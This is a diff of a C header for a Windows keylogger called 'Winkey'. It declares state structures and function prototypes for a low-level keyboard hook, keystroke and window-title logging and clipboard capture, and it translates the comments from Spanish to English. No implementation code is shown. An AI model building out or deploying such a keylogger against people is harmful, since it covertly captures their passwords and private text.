@@ -15,6 +15,7 @@
 #pragma region "Includes"
 
 	#include <windows.h>
+    #include <string.h>
 	#include <stdio.h>
 	#include <errno.h>
 	#include <time.h>
@@ -27,19 +28,19 @@
 	#define NAME		"Winkey"
 	#define VERSION		"1.0.0"
 
-	// Estructura para el estado global del keylogger
+	// Structure for the global keylogger state
     typedef struct s_winkey_state 
 	{
-        FILE   *logFile;          // archivo de log abierto
-        HHOOK   keyboardHook;     // handle del hook instalado
-        HWND    lastWindow;       // última ventana foreground
-        char    lastTitle[256];   // último título logueado
+        FILE   *logFile;          // opened log file
+        HHOOK   keyboardHook;     // installed hook handle
+        HWND    lastWindow;       // last foreground window
+        char    lastTitle[256];   // last logged window title
     }   t_WinkeyState;
 
 	typedef struct s_clipboard_state 
 	{
-		FILE   *clipboardFile;			// archivo de log del portapapeles
-		char   lastClipboardText[512];	// último texto del portapapeles
+		FILE   *clipboardFile;          // clipboard log file
+		char   lastClipboardText[512];  // last clipboard text
 	}   t_ClipboardState;
 
 	extern t_WinkeyState g_winkeyState;
@@ -54,22 +55,25 @@
 	// main.c
     BOOL IsAdmin(void);
 
-    // service.c - Gestión del servicio y activación/desactivación
+    // service.c - Service management and activation/deactivation
     BOOL ActivateHook(void);
     void DeactivateHook(void);
 
-    // hook.c - Callback del hook para service.c
+    // hook.c - Hook callback used by service.c
     LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
-    // log.c - Gestión del archivo de log principal
+    // log.c - Main log file management
     BOOL OpenLogFile(void);
 
-    // key.c - Conversión de teclas a texto legible
+    // key.c - Key codes to human-readable text conversion
     const char *VkCodeToString(DWORD vkCode);
     
-    // clipboard.c - Gestión del log del portapapeles
+    // clipboard.c - Clipboard log management
     BOOL OpenClipboardLog(void);
     void CloseClipboardLog(void);
     void LogClipboardIfChanged(void);
+
+    // keyboardstate.c
+    void BuildKeyboardState(BYTE ks[256]);
 
 #pragma endregion
